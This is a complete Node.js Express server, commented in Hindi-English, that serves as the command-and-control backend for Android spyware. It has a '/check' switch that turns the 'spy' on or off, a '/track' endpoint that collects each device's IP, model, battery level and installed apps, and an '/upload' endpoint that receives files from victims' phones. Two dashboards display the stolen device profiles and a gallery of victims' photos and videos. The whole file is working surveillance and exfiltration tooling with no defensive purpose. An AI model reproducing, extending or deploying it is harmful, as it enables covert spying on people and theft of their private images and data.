const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

/* ================= CONFIG ================= */
const LOG_FILE = "logs.json";
const UPLOAD_DIR = path.join(__dirname, "uploads");
const CONFIG_FILE = "config.json";   // ← Spy on/off ke liye

if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

// Default config
let spyConfig = { enabled: true };

if (fs.existsSync(CONFIG_FILE)) {
  try {
    spyConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
  } catch (e) {
    console.log("Config load failed, using default");
  }
}

/* ================= HELPERS ================= */
function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch (e) {}
}

function parseBody(body) {
  const obj = {};
  body.split("&").forEach(pair => {
    const [key, value] = pair.split("=");
    if (key && value) {
      obj[key] = decodeURIComponent(value);
    }
  });
  if (obj.apps) {
    obj.apps = obj.apps.split(",").map(x => x.trim()).filter(Boolean);
  }
  return obj;
}

/* ================= CHECK ENDPOINT (for app) ================= */
app.get('/check', (req, res) => {
  const ip = getIP(req);
  console.log(`📡 /check from ${ip} | enabled: ${spyConfig.enabled}`);

  res.json({
    enabled: spyConfig.enabled,
    message: spyConfig.enabled ? "spy active" : "spy disabled",
    timestamp: new Date().toISOString()
  });
});

/* ================= TRACK ================= */
app.post('/track', (req, res) => {
  let body = "";
  req.on('data', chunk => body += chunk.toString());
  req.on('end', () => {
    const parsed = parseBody(body);
    const data = {
      ip: getIP(req),
      battery: parsed.battery,
      model: parsed.model,
      brand: parsed.brand,
      android: parsed.android,
      apps: parsed.apps || [],
      time: new Date().toISOString()
    };

    console.log("\n📱 DEVICE =====================");
    console.log("IP:", data.ip);
    console.log("Battery:", data.battery);
    console.log("Apps count:", data.apps.length);

    saveLog(data);
    res.json({ status: "ok" });
  });
});

/* ================= UPLOAD ================= */
app.post('/upload', (req, res) => {
  let fileName = Date.now().toString();
  if (req.query.name) {
    const original = path.basename(req.query.name);
    const ext = path.extname(original);
    fileName += ext || ".bin";
  } else {
    fileName += ".bin";
  }

  const filePath = path.join(UPLOAD_DIR, fileName);
  const stream = fs.createWriteStream(filePath);

  req.pipe(stream);

  req.on('end', () => {
    console.log("\n📦 FILE RECEIVED =====================");
    console.log("Saved as:", fileName);

    saveLog({
      type: "file",
      file: fileName,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", file: fileName });
  });

  req.on('error', () => {
    res.status(500).send("error");
  });
});

/* ================= USERS ================= */
app.get('/users', (req, res) => {
  if (!fs.existsSync(LOG_FILE)) return res.send("No data yet");

  const logs = fs.readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map(x => JSON.parse(x));

  const unique = {};
  logs.forEach(log => {
    if (!log.ip || !log.model) return;
    const key = log.ip + "_" + log.model;
    unique[key] = log;   // latest entry
  });

  const list = Object.values(unique);

  let html = `
  <html>
  <head>
    <style>
      body { background:#111; color:#fff; font-family:sans-serif; padding:20px; }
      .card { border:1px solid #333; padding:15px; margin:10px 0; border-radius:10px; background:#1a1a1a; }
      .apps { max-height:180px; overflow:auto; background:#000; padding:8px; font-size:12px; }
    </style>
  </head>
  <body>
    <h2>Total Devices: ${list.length}</h2>
  `;

  list.reverse().forEach(user => {
    html += `
    <div class="card">
      <b>IP:</b> ${user.ip}<br>
      <b>Device:</b> ${user.brand} ${user.model}<br>
      <b>Android:</b> ${user.android}<br>
      <b>Battery:</b> ${user.battery}<br>
      <h4>Apps (${user.apps?.length || 0})</h4>
      <div class="apps">
        ${(user.apps || []).map(a => `<div>${a}</div>`).join("")}
      </div>
    </div>`;
  });

  html += "</body></html>";
  res.send(html);
});

/* ================= GALLERY ================= */
app.get('/gallery', (req, res) => {
  if (!fs.existsSync(UPLOAD_DIR)) return res.send("No uploads yet");

  const files = fs.readdirSync(UPLOAD_DIR);
  let html = `
  <html>
  <head>
    <style>
      body { background:#111; color:#fff; font-family:sans-serif; padding:20px; }
      .grid { display:flex; flex-wrap:wrap; gap:15px; }
      .card { margin:10px; text-align:center; }
      img, video { width:240px; border-radius:10px; }
      a { color:#0af; }
    </style>
  </head>
  <body>
    <h2>Total Files: ${files.length}</h2>
    <div class="grid">
  `;

  files.reverse().forEach(file => {
    const url = `/uploads/${file}`;
    if (file.match(/\.(jpg|jpeg|png)$/i)) {
      html += `
        <div class="card">
          <img src="${url}" />
          <br><a href="${url}" download>⬇ Download</a>
        </div>`;
    } else if (file.endsWith(".mp4")) {
      html += `
        <div class="card">
          <video controls width="240">
            <source src="${url}" type="video/mp4">
          </video>
          <br><a href="${url}" download>⬇ Download</a>
        </div>`;
    } else {
      html += `<div class="card"><a href="${url}" target="_blank">${file}</a></div>`;
    }
  });

  html += `</div></body></html>`;
  res.send(html);
});

/* ================= STATIC FILES ================= */
app.use('/uploads', express.static(UPLOAD_DIR));

/* ================= START SERVER ================= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`   /check     → ${spyConfig.enabled ? 'ENABLED' : 'DISABLED'}`);
  console.log(`   /users     → http://yourdomain:${PORT}/users`);
  console.log(`   /gallery   → http://yourdomain:${PORT}/gallery`);
});
